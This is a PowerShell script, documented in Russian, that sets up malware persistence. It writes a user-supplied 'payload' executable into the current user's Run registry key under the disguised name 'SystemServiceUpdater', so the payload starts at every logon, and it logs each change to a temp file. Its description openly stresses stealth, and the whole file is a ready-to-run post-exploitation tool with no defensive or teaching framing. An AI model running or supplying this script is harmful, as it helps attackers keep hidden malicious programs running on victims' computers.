<#
.SYNOPSIS
    Создаёт стойкую персистентность через RunKey в реестре HKCU.
.DESCRIPTION
    Добавляет ключ в реестр пользователя, чтобы исполняемый файл запускался при каждом логине.
    Обеспечивает малозаметность, проверяет наличие ключа и логирует изменения в файл.
#>

param (
    [Parameter(Mandatory = $true)]
    [string]$PayloadPath,   # Путь к исполняемому файлу

    [string]$EntryName = "SystemServiceUpdater",  # Название ключа

    [string]$LogPath = "$env:TEMP\runkey_persistence.log"  # Путь к логу
)

function Write-Log {
    param([string]$message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp : $message" | Out-File -FilePath $LogPath -Append -Encoding utf8
}

function Add-RunKey {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    try {
        $existing = Get-ItemProperty -Path $regPath -Name $EntryName -ErrorAction SilentlyContinue
        if ($existing -ne $null -and $existing.$EntryName -eq $PayloadPath) {
            Write-Log "RunKey '$EntryName' already exists and is correct. Skipping."
            return
        }

        Set-ItemProperty -Path $regPath -Name $EntryName -Value $PayloadPath
        Write-Log "RunKey '$EntryName' created successfully. PayloadPath: $PayloadPath"
    }
    catch {
        Write-Log "Failed to set RunKey '$EntryName'. Error: $_"
    }
}

function Validate-Path {
    if (-Not (Test-Path $PayloadPath)) {
        Write-Log "Payload path not found: $PayloadPath"
        throw "Payload not found at path: $PayloadPath"
    }
}

# MAIN EXECUTION
Write-Log "Starting RunKey persistence setup..."
Validate-Path
Add-RunKey
Write-Log "Persistence via RunKey completed."
